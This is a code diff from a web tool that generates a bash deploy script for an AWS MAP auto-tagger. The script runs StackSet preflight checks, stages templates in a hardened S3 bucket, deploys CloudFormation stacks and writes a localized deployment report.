+    # (AllowedPattern: ^mig[a-zA-Z0-9]+\$). Skips test harness stacks.
+    case "\$SS_MPE" in mig*) ;; *) continue ;; esac
+    if [ "\$SS_MPE" = "\$MPE" ]; then continue; fi  # same MPE = in-place update, not a conflict
+    EXISTING_ACCOUNTS=\$(aws cloudformation list-stack-instances --stack-set-name "\$SS" --region "\$REGION" \\
+        --query 'Summaries[].Account' --output text 2>/dev/null | tr '\\t' '\\n')
+    OVERLAP=\$(comm -12 <(sort -u "\$NEW_TARGET_ACCOUNTS_FILE") <(echo "\$EXISTING_ACCOUNTS" | sort -u))
+    if [ -n "\$OVERLAP" ]; then
+        if [ \$CONFLICTS_FOUND -eq 0 ]; then
+            echo "  ❌ ${t('d_fail_stackset_conflict')}"
+            CONFLICTS_FOUND=1
+        fi
+        echo "     Conflict with StackSet \$SS (MPE \$SS_MPE) in these accounts:"
+        echo "\$OVERLAP" | sed 's/^/       - /'
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} Conflict with \$SS in \$(echo \$OVERLAP | wc -w) account(s)\\n"
+    fi
+done
+rm -f "\$NEW_TARGET_ACCOUNTS_FILE"
+if [ \$CONFLICTS_FOUND -eq 1 ]; then
+    echo "     ${t('d_fix_label')} ${t('d_fix_stackset_conflict')}"
+    ERRORS=\$((ERRORS + 1))
+else
+    echo "  ✅ ${t('d_ok_stackset_conflict')}"
+    PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_stackset_conflict')}\\n"
+fi
+
+${config.useAccountScope && config.stacksetAccounts && config.stacksetAccounts.length > 0 ? `
+for CHECK_ACCT in ${config.stacksetAccounts.map(a => '"' + a.id + '"').join(' ')}; do
+    ACCT_RESULT=\$(aws organizations describe-account --account-id "\$CHECK_ACCT" --query 'Account.Id' --output text 2>/dev/null) || ACCT_RESULT=""
+    if [ "\$ACCT_RESULT" = "\$CHECK_ACCT" ]; then
+        echo "  ✅ ${t('d_ok_account_scope')} \$CHECK_ACCT"
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_pass')} ${t('d_ok_account_scope')} \$CHECK_ACCT\\n"
+    else
+        echo "  ❌ ${t('d_fail_account_scope')} \$CHECK_ACCT"
+        echo "     ${t('d_fix_label')} ${t('d_fix_account_scope')}"
+        PREFLIGHT_LOG="\${PREFLIGHT_LOG}${t('d_log_fail')} ${t('d_fail_account_scope')} \$CHECK_ACCT\\n"
+        ERRORS=\$((ERRORS + 1))
+    fi
+done` : ''}
+if [ "\$ERRORS" -gt 0 ]; then
+    echo ""
+    echo "  ────────────────────────────────────────────"
+    echo "  ❌ \$ERRORS ${t('d_checks_failed')}"
+    echo "  ────────────────────────────────────────────"
+    DEPLOY_STATUS="FAILED"
+    {
+      echo "${t('r_title')}"
+      echo "========================================"
+      echo "${t('r_customer')}: \$CUSTOMER"
+      echo "${t('r_mpe')}: \$MPE"
+      echo "${t('r_region')}: \$REGION"
+      echo "${t('r_account')}: \$ACCOUNT"
+      echo "${t('r_date')}: \$DEPLOY_TIME"
+      echo "${t('r_result')}: \$DEPLOY_STATUS"
+      echo ""
+      echo "${t('r_preflight')}"
+      echo "-------------------------"
+      printf '%b' "\$PREFLIGHT_LOG"
+      echo ""
+      echo "${t('r_action')}"
+      echo "  ${t('r_action_desc')}"
+      echo "  ${t('r_share_help')}"
+    } > "\$REPORT_FILE"
+    echo ""
+    echo "  📄 \$REPORT_FILE"
+    echo "     ${t('d_share_report')}"
+    exit 1
+fi
+echo ""
+echo "  ✅ ${t('d_all_passed')}"
+echo ""
+
+# ── Step 2: Deploy ───────────────────────────
+echo "${t('d_step2')}"
+echo "  ${t('d_step2_wait_multi')}"
+echo ""
+
+ORG_TEMPLATE=\$(mktemp /tmp/map-auto-tagger-org-XXXX.yaml)
+ACCOUNTS_TEMPLATE=\$(mktemp /tmp/map-auto-tagger-accounts-XXXX.yaml)
+
+cat > "\$ORG_TEMPLATE" << 'ORG_TEMPLATE_EOF'
+${orgTpl}
+ORG_TEMPLATE_EOF
+
+cat > "\$ACCOUNTS_TEMPLATE" << 'ACCOUNTS_TEMPLATE_EOF'
+${accountsTpl}
+ACCOUNTS_TEMPLATE_EOF
+
+if aws s3api head-bucket --bucket "\${BUCKET}" 2>/dev/null; then
+    ACTUAL_LOC=\$(aws s3api get-bucket-location --bucket "\${BUCKET}" --query LocationConstraint --output text 2>/dev/null)
+    [ "\$ACTUAL_LOC" = "None" ] || [ "\$ACTUAL_LOC" = "null" ] && ACTUAL_LOC="us-east-1"
+    if [ "\$ACTUAL_LOC" != "\$REGION" ]; then
+        echo "  ❌ ERROR: Staging bucket \${BUCKET} exists in \${ACTUAL_LOC}, not \${REGION}."
+        echo "     Delete the bucket or use a different account."
+        exit 1
+    fi
+else
+    aws s3 mb "s3://\${BUCKET}" --region "\${REGION}"
+fi
+for i in 1 2 3 4 5; do
+    aws s3api put-public-access-block --bucket "\${BUCKET}" --public-access-block-configuration "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true" > /dev/null 2>&1 && break
+    sleep 2
+done
+aws s3api put-bucket-encryption --bucket "\${BUCKET}" --server-side-encryption-configuration '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}' > /dev/null 2>&1 || true
+BUCKET_POLICY=\$(printf '{"Version":"2012-10-17","Statement":[{"Sid":"DenyHTTP","Effect":"Deny","Principal":"*","Action":"s3:*","Resource":["arn:aws:s3:::%s","arn:aws:s3:::%s/*"],"Condition":{"Bool":{"aws:SecureTransport":"false"}}}]}' "\${BUCKET}" "\${BUCKET}")
+aws s3api put-bucket-policy --bucket "\${BUCKET}" --policy "\${BUCKET_POLICY}" > /dev/null 2>&1 || true
+aws s3 cp "\$ORG_TEMPLATE" "s3://\${BUCKET}/map-auto-tagger-org.yaml" > /dev/null
+aws s3 cp "\$ACCOUNTS_TEMPLATE" "s3://\${BUCKET}/map-auto-tagger-accounts-\${MPE}.yaml" > /dev/null
+rm -f "\$ORG_TEMPLATE" "\$ACCOUNTS_TEMPLATE"
+
+STACK_STATUS=\$(aws cloudformation describe-stacks --stack-name "\$STACK_NAME" --region "\$REGION" --query 'Stacks[0].StackStatus' --output text 2>/dev/null || echo "DOES_NOT_EXIST")
+ORG_TEMPLATE_URL="https://\${BUCKET}.s3.\${REGION}.amazonaws.com/map-auto-tagger-org.yaml"
+ORG_PARAMS="ParameterKey=PerAccountTemplateURL,ParameterValue=https://\${BUCKET}.s3.\${REGION}.amazonaws.com/map-auto-tagger-accounts-\${MPE}.yaml"
+if [ "\$STACK_STATUS" = "DOES_NOT_EXIST" ] || [ "\$STACK_STATUS" = "DELETE_COMPLETE" ] || [ "\$STACK_STATUS" = "ROLLBACK_COMPLETE" ]; then
+    aws logs delete-log-group --log-group-name "/aws/lambda/map-auto-tagger-\$MPE" --region "\$REGION" 2>/dev/null || true
+    aws logs delete-log-group --log-group-name "/aws/lambda/map-auto-tagger-backfill-\$MPE" --region "\$REGION" 2>/dev/null || true
+fi
+if [ "\$STACK_STATUS" = "DOES_NOT_EXIST" ] || [ "\$STACK_STATUS" = "DELETE_COMPLETE" ]; then
+    aws cloudformation create-stack \\
+      --stack-name "\$STACK_NAME" \\
+      --template-url "\$ORG_TEMPLATE_URL" \\
+      --parameters "\$ORG_PARAMS" \\
+      --capabilities CAPABILITY_NAMED_IAM \\
+      --region "\$REGION" > /dev/null
+elif [ "\$STACK_STATUS" = "ROLLBACK_COMPLETE" ]; then
+    aws cloudformation delete-stack --stack-name "\$STACK_NAME" --region "\$REGION"
+    aws cloudformation wait stack-delete-complete --stack-name "\$STACK_NAME" --region "\$REGION"
+    aws cloudformation create-stack \\
+      --stack-name "\$STACK_NAME" \\
+      --template-url "\$ORG_TEMPLATE_URL" \\
+      --parameters "\$ORG_PARAMS" \\
+      --capabilities CAPABILITY_NAMED_IAM \\
+      --region "\$REGION" > /dev/null
+else
+    aws cloudformation update-stack \\
+      --stack-name "\$STACK_NAME" \\
+      --template-url "\$ORG_TEMPLATE_URL" \\
+      --parameters "\$ORG_PARAMS" \\
+      --capabilities CAPABILITY_NAMED_IAM \\
+      --region "\$REGION" > /dev/null 2>&1 || true
+fi
+
+echo "  ${t('d_deploying')}"
+echo ""
+
+WAIT_SECS=0
+while true; do
+  STATUS=\$(aws cloudformation describe-stacks --stack-name "\$STACK_NAME" --region "\$REGION" --query 'Stacks[0].StackStatus' --output text 2>/dev/null)
+  if [ "\$STATUS" = "CREATE_COMPLETE" ] || [ "\$STATUS" = "UPDATE_COMPLETE" ]; then
+    break
+  elif [ "\$STATUS" = "CREATE_FAILED" ] || [ "\$STATUS" = "ROLLBACK_COMPLETE" ] || [ "\$STATUS" = "UPDATE_ROLLBACK_COMPLETE" ]; then
+    DEPLOY_STATUS="FAILED — \$STATUS"
+    echo "  ❌ ${t('d_deploy_failed')}"
+    break
+  fi
+  sleep 30
+  WAIT_SECS=\$((WAIT_SECS + 30))
+  echo "  ${t('d_still_deploying')} (\${WAIT_SECS}s ${t('d_elapsed')})"
+done
+# Wait for StackSet instances to reach CURRENT (stack may be COMPLETE before StackSet finishes).
+# Gate on "NOT STARTED" rather than -z: DEPLOY_STATUS is initialized non-empty at the top of
+# the script, so the prior -z guard was always false and this whole StackSet-wait block ran
+# as dead code. Any upstream failure marks DEPLOY_STATUS="FAILED — ..." and skips this block.
+if [ "\$DEPLOY_STATUS" = "NOT STARTED" ]; then
+  STACKSET_NAME=\$(aws cloudformation describe-stacks --stack-name "\$STACK_NAME" --region "\$REGION" \\
+    --query "Stacks[0].Outputs[?OutputKey=='StackSetName'].OutputValue" --output text 2>/dev/null)
+  if [ -n "\$STACKSET_NAME" ] && [ "\$STACKSET_NAME" != "None" ]; then
+    echo ""
+    echo "  Waiting for StackSet instances to deploy..."
+    SS_WAIT=0
+    while [ \$SS_WAIT -lt 1200 ]; do
+      OUTDATED=\$(aws cloudformation list-stack-instances --stack-set-name "\$STACKSET_NAME" \\
+        --region "\$REGION" --query "Summaries[?Status!='CURRENT'].Account" --output text 2>/dev/null | wc -w | tr -d ' ')
+      FAILED=\$(aws cloudformation list-stack-instances --stack-set-name "\$STACKSET_NAME" \\
+        --region "\$REGION" --query "Summaries[?Status=='CANCELLED'||Status=='FAILED'].Account" --output text 2>/dev/null | wc -w | tr -d ' ')
+      TOTAL=\$(aws cloudformation list-stack-instances --stack-set-name "\$STACKSET_NAME" \\
+        --region "\$REGION" --query "Summaries[*].Account" --output text 2>/dev/null | wc -w | tr -d ' ')
+      CURRENT=\$((TOTAL - OUTDATED))
+      echo "  StackSet progress: \${CURRENT}/\${TOTAL} accounts ready... (\${SS_WAIT}s)"
+      if [ "\$TOTAL" -gt 0 ] && [ "\$OUTDATED" -eq 0 ]; then
+        echo "  ✅ StackSet: all \${TOTAL} accounts ready"
+        DEPLOY_STATUS="SUCCESS"
+        break
+      elif [ "\$FAILED" -gt 0 ]; then
+        DEPLOY_STATUS="FAILED — \$FAILED account(s) failed in StackSet"
+        echo "  ❌ \$FAILED account(s) failed. Check CloudFormation StackSet for details."
+        break
+      fi
+      sleep 30
+      SS_WAIT=\$((SS_WAIT + 30))
+    done
+    # If the 1200s wait expired without reaching all-CURRENT or any FAILED, the StackSet
+    # is still rolling out. Mark as SUCCESS — stack create completed; continued rollout
+    # is tracked by CloudFormation itself and visible via list-stack-instances.
+    if [ "\$DEPLOY_STATUS" = "NOT STARTED" ]; then DEPLOY_STATUS="SUCCESS"; fi
+  else
+    DEPLOY_STATUS="SUCCESS"
+  fi
+fi
+${config.includeBackfill ? `
+# ── Backfill wait ────────────────────────────
+if [ "\$DEPLOY_STATUS" = "SUCCESS" ]; then
+  echo ""
+  echo "${t('d_backfill_waiting')}"
+  echo "  ${t('d_backfill_wait_info')}"
+  echo ""
+  BACKFILL_RESULT="${t('d_backfill_timeout')}"
+  BACKFILL_WAIT_START_MS=\$(( \$(date +%s) * 1000 ))
+  WAIT=0
+  # See rationale in the single-account branch — backfill is a Custom::Backfill
+  # CustomResource, not an EventBridge rule. Poll the Lambda's log group directly.
+  while [ \$WAIT -lt 1200 ]; do
+    COMPLETE=\$(aws logs filter-log-events \\
+      --log-group-name "/aws/lambda/map-auto-tagger-backfill-\$MPE" \\
+      --region "\$REGION" \\
+      --filter-pattern '"Backfill complete"' \\
+      --start-time "\$BACKFILL_WAIT_START_MS" \\
+      --max-items 1 \\
+      --query 'events[0].message' \\
+      --output text 2>/dev/null)
+    if [ -n "\$COMPLETE" ] && [ "\$COMPLETE" != "None" ]; then
+      BACKFILL_RESULT="\$COMPLETE"
+      echo "  ✅ ${t('d_backfill_done')} \$BACKFILL_RESULT"
+      break
+    fi
+    sleep 30
+    WAIT=\$((WAIT + 30))
+    echo "  ${t('d_backfill_in_progress')} (\${WAIT}s)"
+  done
+  echo ""
+fi` : ''}
+# ── Step 3: Report ───────────────────────────
+echo ""
+echo "${t('d_step3')}"
+
+{
+  echo "${t('r_title')}"
+  echo "========================================"
+  echo "${t('r_customer')}: \$CUSTOMER"
+  echo "${t('r_mpe')}: \$MPE"
+  echo "${t('r_region')}: \$REGION"
+  echo "${t('r_account')}: \$ACCOUNT"
+  echo "${t('r_date')}: \$DEPLOY_TIME"
+  echo "${t('r_result')}: \$DEPLOY_STATUS"
+  echo ""
+  echo "${t('r_preflight')}"
+  echo "-------------------------"
+  printf '%b' "\$PREFLIGHT_LOG"
+  echo ""
+  if [ "\$DEPLOY_STATUS" = "SUCCESS" ]; then
+    echo "${t('r_deployed')}"
+    echo "------------------"
+    echo "  - Auto-tagger: ${regions.join(', ')}"
+    echo "  - EventBridge, DLQ, CloudWatch alarm, SSM config"
+    ${config.includeBackfill ? `echo "  - Backfill Lambda"` : ''}
+    echo ""
+    echo "${t('r_verify')}"
+    echo "--------------"
+    echo "  ${t('r_verify1')}"
+    echo "  ${t('r_verify2')}"
+    echo "  ${t('r_verify3')} \$MPE"
+    echo ""
+    ${config.includeBackfill ? `echo "${t('r_backfill_result')}"
+    echo "----------------"
+    echo "  \$BACKFILL_RESULT"
+    echo ""` : ''}
+    echo "${t('r_perstatus')}"
+    echo "-------------------"
+    echo "  aws cloudformation list-stack-instances --stack-set-name map-auto-tagger-\$MPE \\"
+    echo "    --query 'Summaries[*].[Account,Region,StackInstanceStatus.DetailedStatus]' \\"
+    echo "    --output table --region \$REGION"
+  else
+    echo "${t('r_action')}"
+    echo "  ${t('r_action_desc')}"
+  fi
+  echo ""
+  echo "${t('r_support')}"
+  echo "--------"
+  echo "  ${t('r_contact')}"
+} > "\$REPORT_FILE"
+
+if [ "\$DEPLOY_STATUS" = "SUCCESS" ]; then
+  echo ""
+  echo "  ┌─────────────────────────────────────────┐"
+  echo "  │   ✅ ${t('d_complete_title')}               │"
+  echo "  │   ${t('d_complete_multi')}  │"
+  echo "  └─────────────────────────────────────────┘"
+  echo ""
+fi
+
+echo "  📄 ${t('d_report_saved')} \$REPORT_FILE"
+echo "     ${t('d_share_report')}"
+echo ""
+`;
+        }
+
+        function generateAndDownload() {
+            const config = getConfig();
+            // Warn loudly (but permit) when Alert email is blank.
+            // Zero-subscriber SNS topics silently drop every tagging-failure
+            // alert — a customer hitting a Lambda bug or SCP drift won't know
+            // until they reconcile MAP credit at the end of the quarter. We
+            // gate the customer's explicit choice via confirm(), rather than
+            // forcing it, so customers who have alternative alerting in place
+            // (CloudWatch cross-account, SIEM) can proceed. Subscriber can be
+            // added later via scripts/add_subscriber.sh without redeploy.
+            if (!config.alertEmail || !config.alertEmail.trim()) {
+                const proceed = window.confirm(t('ui_alert_email_missing_warn'));
+                if (!proceed) {
+                    return;
+                }
+            }
+            const isStackset = config.deployMode === 'multi';
+            const mainTemplate = isStackset ? generateOrgTemplate(config) : generateMainTemplate(config);
+            const perAccountTemplate = isStackset ? generatePerAccountTemplate(config) : null;
+            // Pass templates into script so everything is embedded — customer gets ONE file
+            const deployScript = generateDeployScript(config, mainTemplate, perAccountTemplate);
+            const instructions = generateInstructions(config);
+            window._generated = { config, mainTemplate, perAccountTemplate, deployScript, instructions };
+
+            const btnDiv = document.getElementById('downloadButtons');
+            const isMulti = isStackset;
+            const accountLabel = t(isMulti ? 'ui_mgmt_account' : 'ui_migration_account_label');
+            // Update template download button for multi-account (two templates)
+            const tplBtn = document.getElementById('downloadTemplateBtn');
+            if (tplBtn) {
+                if (isMulti) {
+                    tplBtn.onclick = () => { downloadFile('org'); downloadFile('accounts'); };
+                } else {
+                    tplBtn.onclick = () => downloadFile('');
+                }
+            }
+            btnDiv.innerHTML = `
+                <button class="btn-primary" onclick="downloadFile('script')" style="font-size:16px;padding:14px 32px;">⬇ ${t('ui_btn_download')} deploy.sh</button>
+                <button class="btn-secondary" onclick="copyInstructions()">📋 ${t('ui_btn_copy')}</button>`;
+
+            document.getElementById('deployHint').innerHTML = `
+                <div style="padding:12px 16px;background:#f2fcf3;border-left:4px solid #1d8102;border-radius:0 4px 4px 0;font-size:13px;">
+                  <strong>${t('ui_one_file_step')}</strong> ${t('ui_send_script')} <code>deploy.sh</code> ${t('ui_to_customer')}<br>
+                  <strong>${t('ui_instr_opt1_title')}:</strong> ${t('ui_cloudshell_open')} <strong>AWS CloudShell</strong> ${t('ui_in_account')} ${accountLabel}, ${t('ui_upload_and_run')}: <code>bash deploy.sh</code><br>
+                  <strong>${t('ui_instr_opt2_title')}:</strong> ${t('ui_cli_alt_short')} <code>bash deploy.sh</code>
+                </div>`;
+
+            document.getElementById('instructions').textContent = instructions;
+            document.getElementById('templatePreview').textContent = mainTemplate;
+            setStep(3);
+            applyTranslations();
+        }
+
+        function downloadFile(type) {
+            const { config, mainTemplate, perAccountTemplate, deployScript } = window._generated;
+            const customerSlug = config.customerName
+                ? config.customerName.trim().toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '')
+                : '';
+            const fileId = customerSlug ? `${customerSlug}-${config.mpeId}` : config.mpeId;
+            let content, filename, mime;
+            if (type === 'script') {
+                // Regenerate in current language in case user switched language after Step 2
+                content = generateDeployScript(config, mainTemplate, perAccountTemplate);
+                filename = `deploy-${fileId}.sh`;
+                mime = 'text/x-sh';
+            } else if (type === 'org') {
+                content = mainTemplate;
+                filename = `map-auto-tagger-org-${fileId}.yaml`;
+            } else if (type === 'accounts') {
+                content = perAccountTemplate;
+                filename = `map-auto-tagger-accounts-${fileId}.yaml`;
+            } else {
+                content = mainTemplate;
+                filename = `map-auto-tagger-${fileId}.yaml`;
+            }
+            const blob = new Blob([content], { type: mime || 'text/yaml' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function copyInstructions() {
+            navigator.clipboard.writeText(document.getElementById('instructions').textContent).then(() => {
+                const btn = event.target;
+                const orig = btn.textContent;
+                btn.textContent = '✓ Copied!';
+                setTimeout(() => btn.textContent = orig, 2000);
+            });
+        }
